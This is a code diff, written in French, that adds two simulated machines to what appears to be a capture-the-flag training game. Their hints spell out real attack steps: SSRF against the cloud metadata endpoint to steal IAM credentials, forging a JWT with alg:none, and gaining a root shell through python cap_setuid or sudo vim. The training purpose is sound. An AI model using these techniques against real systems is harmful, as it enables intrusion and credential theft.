@@ -839,6 +839,178 @@ const MACHINES = [
 
   // ─────────────────────────────────────────────────────────────────
   {
+    id: "parallax",
+    name: "PARALLAX",
+    ip: "10.10.11.170",
+    difficulty: "Difficile",
+    os: "Linux (Ubuntu 24.04)",
+    briefing: "Un portail interne qui génère des aperçus de liens partagés (façon bot Slack). Le proxy qui va chercher ces liens semble un peu trop confiant sur ce qu'il accepte de contacter.",
+    ports: [
+      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.6p1 Ubuntu" },
+      { port: 80, proto: "tcp", state: "open", service: "http", version: "nginx 1.24 — Parallax Link Preview" },
+    ],
+    web: {
+      "/": "<html>\n<head><title>Parallax Link Preview</title></head>\n<body>\n<h1>Parallax — aperçu de liens partagés</h1>\n<p>Colle un lien, on en génère un aperçu pour le canal interne.</p>\n<!-- endpoint utilisé par le bot Slack : /preview?url=<url> -->\n<!-- TODO: restreindre les hôtes joignables depuis le proxy d'aperçu -->\n</body>\n</html>",
+    },
+    ftp: { enabled: false },
+    // SSRF : /preview va chercher l'URL fournie pour le compte du serveur. Le seul hôte
+    // "utile" atteignable est un faux endpoint de métadonnées cloud interne (169.254.169.254,
+    // façon AWS) qui fuit un rôle IAM puis des identifiants temporaires pour ce rôle.
+    ssrf: {
+      path: "/preview",
+      param: "url",
+      responses: {
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/": "parallax-deploy-role",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/parallax-deploy-role":
+          "{\n  \"Code\": \"Success\",\n  \"Role\": \"parallax-deploy-role\",\n  \"AccessKeyId\": \"ASIAPRLX7QK29F\",\n  \"SecretAccessKey\": \"6f2ac91b7de3441c9a8f\",\n  \"Token\": \"PXSTS-8f2c91ad4e\",\n  \"Expiration\": \"2026-12-31T23:59:59Z\"\n}",
+      },
+      blockedMsg: "Aperçu indisponible pour cette URL : le trafic sortant réel vers Internet est filtré depuis ce proxy — seuls certains hôtes internes précis répondent.",
+    },
+    cloud: {
+      provider: "s3",
+      buckets: {
+        "parallax-public-assets": {
+          public: true,
+          files: {
+            "about.txt": "Parallax Internal Tools — portail interne de génération d'aperçus de liens pour la communication d'équipe.",
+          },
+        },
+        "parallax-secure-artifacts": {
+          public: false,
+          requiresRole: "parallax-deploy-role",
+          files: {
+            "deploy.env": "# deploy.env — variables d'environnement du déploiement (NE PAS committer)\n" +
+              "SSH_USER=nrichard\nSSH_PASS=P4rallax_Deploy_R0le!42\n" +
+              "# note : nrichard n'a pas de sudo, vérifier les capabilities Linux (getcap) avant de chercher plus loin",
+          },
+        },
+      },
+      // Rôle IAM assumable une fois le jeton de sécurité temporaire récupéré via la SSRF.
+      assumableRole: { role: "parallax-deploy-role", token: "PXSTS-8f2c91ad4e" },
+    },
+    sshUsers: {
+      nrichard: { password: "P4rallax_Deploy_R0le!42" },
+    },
+    targetFS: {
+      hostname: "parallax",
+      homeDir: "/home/nrichard",
+      users: {
+        nrichard: {
+          home: "/home/nrichard",
+          fs: {
+            "user.txt": { type: "file", content: "FLAG{parallax_acces_initial_ssrf_metadata_leak}", perms: "-rw-r-----", owner: "nrichard" },
+            ".bash_history": { type: "file", content: "sudo -l\ngetcap -r / 2>/dev/null\nexit", perms: "-rw-------", owner: "nrichard" },
+            "notes.txt": { type: "file", content: "Pense-bête : sudo -l ne montre rien pour moi. L'audit sécurité avait signalé des capabilities Linux laissées sur un interpréteur — à vérifier avec `getcap`.", perms: "-rw-r--r--", owner: "nrichard" },
+            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nLe rapport de R. Kade mentionnait explicitement ce proxy d'aperçus comme \"surface non maîtrisée\" — capable de contacter des services internes sans restriction. Toujours pas de liste blanche d'hôtes en place.", perms: "-rw-r--r--", owner: "nrichard" },
+          },
+        },
+      },
+      extraFS: {},
+      capabilities: ["/usr/bin/python3.11 = cap_setuid+ep"],
+      sudoL: "Désolé, l'utilisateur nrichard n'est pas autorisé à exécuter sudo sur parallax.\n(Regarde plutôt du côté des capabilities Linux sur les binaires...)",
+    },
+    privesc: {
+      type: "capability",
+      binPath: "/usr/bin/python3.11",
+      capText: "cap_setuid+ep",
+      exploitCmdRegex: /^\/usr\/bin\/python3\.11\s+-c\s+["']import\s+os;\s*os\.setuid\(0\);\s*os\.system\(["']\/bin\/sh["']\)["']$/,
+      enterMsg: "# (shell root obtenu via la capability cap_setuid sur python3.11 — technique GTFOBins)",
+    },
+    rootFile: { path: "/root/root.txt", content: "FLAG{parallax_root_capability_setuid_python}" },
+    hints: {
+      recon: [
+        "Le portail propose un outil d'aperçu de lien — ce genre de fonctionnalité effectue souvent une requête HTTP pour le compte de l'utilisateur, côté serveur.",
+        "Après `nmap 10.10.11.170`, lis la page d'accueil avec `curl http://10.10.11.170/` : un commentaire HTML révèle l'endpoint `/preview?url=<url>`.",
+        "Un endpoint qui va chercher n'importe quelle URL fournie par l'utilisateur est un candidat classique de SSRF (Server-Side Request Forgery) : le serveur devient ton proxy.",
+      ],
+      access: [
+        "Les environnements cloud exposent souvent un endpoint de métadonnées interne, injoignable depuis l'extérieur mais accessible depuis la machine elle-même (169.254.169.254, façon AWS).",
+        "Essaie `curl \"http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"` : ça révèle le nom d'un rôle IAM.",
+        "Récupère les identifiants temporaires de ce rôle avec `curl \"http://10.10.11.170/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/parallax-deploy-role\"`, assume le rôle avec `cloudctl assume-role <Token>`, puis lis `cloudctl get s3://parallax-secure-artifacts/deploy.env` qui contient des identifiants SSH.",
+      ],
+      privesc: [
+        "`sudo -l` ne donne rien ici — pas de sudo, pas de cron world-writable, pas de SUID mal placé.",
+        "Les *capabilities* Linux sont une alternative plus fine au bit SUID : elles accordent un privilège précis (comme cap_setuid) à un binaire précis. Vérifie avec `getcap -r /`.",
+        "python3.11 porte la capability `cap_setuid+ep`. Utilise-la pour t'attribuer l'uid 0 puis lancer un shell : `/usr/bin/python3.11 -c \"import os; os.setuid(0); os.system('/bin/sh')\"`.",
+      ],
+    },
+  },
+
+  // ─────────────────────────────────────────────────────────────────
+  {
+    id: "sentry",
+    name: "SENTRY",
+    ip: "10.10.11.185",
+    difficulty: "Difficile",
+    os: "Linux (Ubuntu 24.04)",
+    briefing: "Un tableau de bord d'administration interne, protégé par un jeton d'authentification (JWT). La vérification de ce jeton sent le code legacy jamais revu depuis sa mise en prod.",
+    ports: [
+      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.6p1 Ubuntu" },
+      { port: 80, proto: "tcp", state: "open", service: "http", version: "nginx 1.24 — Sentry Internal API" },
+    ],
+    web: {
+      "/": "<html>\n<head><title>Sentry — API interne</title></head>\n<body>\n<h1>Sentry</h1>\n<p>Tableau de bord d'administration interne. Authentification par jeton.</p>\n<!-- API : GET /api/token?user=guest (jeton de démo) ; GET /api/admin (Authorization: Bearer <jwt> requis) -->\n</body>\n</html>",
+      "/api/token?user=guest": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.8f2c4b9a11e6d3a0c7f5b2e9d4a6c1f0b3e8d7a2c9f1b4e6d0a3c8f5b2e9d4a1",
+    },
+    ftp: { enabled: false },
+    // Authentification JWT mal vérifiée : le serveur ne valide la signature que si
+    // l'en-tête déclare un algorithme HMAC — si le jeton annonce "alg":"none", la
+    // vérification est sautée entièrement (faille "alg:none", réelle et classique).
+    jwtAuth: {
+      path: "/api/admin",
+      header: "authorization",
+      requireClaim: { key: "role", value: "admin" },
+      successBody: "{\n  \"status\": \"ok\",\n  \"panel\": \"admin\",\n  \"message\": \"Bienvenue, admin. Identifiants de service (rotation en cours) : ops_svc / J_w3ak_Alg_N0ne!87\"\n}",
+      missingMsg: "curl: (22) Erreur HTTP 401 sur /api/admin — en-tête Authorization manquant.",
+      deniedMsg: "curl: (22) Erreur HTTP 403 sur /api/admin — jeton refusé (rôle insuffisant ou signature invalide).",
+    },
+    sshUsers: {
+      ops_svc: { password: "J_w3ak_Alg_N0ne!87" },
+    },
+    targetFS: {
+      hostname: "sentry",
+      homeDir: "/home/ops_svc",
+      users: {
+        ops_svc: {
+          home: "/home/ops_svc",
+          fs: {
+            "user.txt": { type: "file", content: "FLAG{sentry_acces_initial_jwt_alg_none}", perms: "-rw-r-----", owner: "ops_svc" },
+            ".bash_history": { type: "file", content: "sudo -l\nexit", perms: "-rw-------", owner: "ops_svc" },
+            "notes.txt": { type: "file", content: "Pense-bête : sudo -l m'autorise vim en root, pratique pour éditer la conf nginx à la volée — mais bon aussi pour bien plus que ça...", perms: "-rw-r--r--", owner: "ops_svc" },
+            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nR. Kade avait signalé que l'API interne acceptait encore d'anciens jetons \"de test\" sans signature. Ticket ouvert, jamais fermé.", perms: "-rw-r--r--", owner: "ops_svc" },
+          },
+        },
+      },
+      extraFS: {},
+      sudoL: "L'utilisateur ops_svc peut lancer les commandes suivantes sur sentry :\n    (root) NOPASSWD: /usr/bin/vim *",
+    },
+    privesc: {
+      type: "sudo-direct",
+      exploitCmdRegex: /^sudo\s+(\/usr\/bin\/)?vim(\s+\S+)?\s+-c\s+['"]:!\s*\/bin\/sh['"]$/,
+      enterMsg: "# (shell root obtenu via vim -c ':!/bin/sh' -- technique GTFOBins)",
+    },
+    rootFile: { path: "/root/root.txt", content: "FLAG{sentry_root_vim_gtfobins}" },
+    hints: {
+      recon: [
+        "Ce tableau de bord protège son accès par un jeton — regarde comment ce jeton est structuré et ce que le site en dit.",
+        "Après `nmap 10.10.11.185`, lis la page d'accueil avec `curl http://10.10.11.185/` : un commentaire HTML révèle deux endpoints, dont un jeton de démo.",
+        "Récupère le jeton de démo avec `curl http://10.10.11.185/api/token?user=guest`, puis décode ses deux premières parties (séparées par des points) en base64url pour voir ce qu'il contient vraiment.",
+      ],
+      access: [
+        "Un jeton JWT a 3 parties séparées par des points : en-tête, charge utile (payload), signature. Décoder une partie : `echo '<partie>' | base64urld` (ajoute le padding manquant si besoin, ou complète simplement le point).",
+        "Le jeton de démo annonce `\"alg\":\"HS256\"` : la signature est censée être vérifiée. Mais certaines implémentations sautent totalement cette vérification si l'en-tête annonce `\"alg\":\"none\"` — c'est la faille \"alg:none\", un grand classique des jetons JWT mal implémentés.",
+        "Forge ton propre jeton : encode `{\"alg\":\"none\",\"typ\":\"JWT\"}` et `{\"user\":\"admin\",\"role\":\"admin\"}` séparément avec `echo -n '<json>' | base64url`, assemble `<en-tête>.<payload>.` (point final, signature vide), puis envoie-le avec `curl -H \"Authorization: Bearer <jeton>\" http://10.10.11.185/api/admin` — la réponse fuite des identifiants SSH.",
+      ],
+      privesc: [
+        "`sudo -l` montre une autorisation NOPASSWD sur `vim` — un classique GTFOBins.",
+        "vim permet d'exécuter une commande shell depuis son mode commande avec `:!<commande>` — et ça marche aussi en argument `-c` au lancement.",
+        "Lance `sudo vim -c ':!/bin/sh'` pour obtenir un shell root directement, sans même ouvrir d'éditeur interactif.",
+      ],
+    },
+  },
+
+  // ─────────────────────────────────────────────────────────────────
+  {
     id: "axiom",
     name: "AXIOM",
     ip: "10.10.11.244",
@@ -918,7 +1090,7 @@ function getMachine(id) {
 // chargement (voir engine.js) et par tests/run.js (une machine volontairement
 // cassée doit remonter au moins une erreur).
 const KNOWN_PRIVESC_TYPES = [
-  "sudo-gtfobins", "sudo-direct", "cron-writable", "schtask-writable", "suid-binary", "docker-group",
+  "sudo-gtfobins", "sudo-direct", "cron-writable", "schtask-writable", "suid-binary", "docker-group", "capability",
 ];
 function validateMachines(machines) {
   const errors = [];
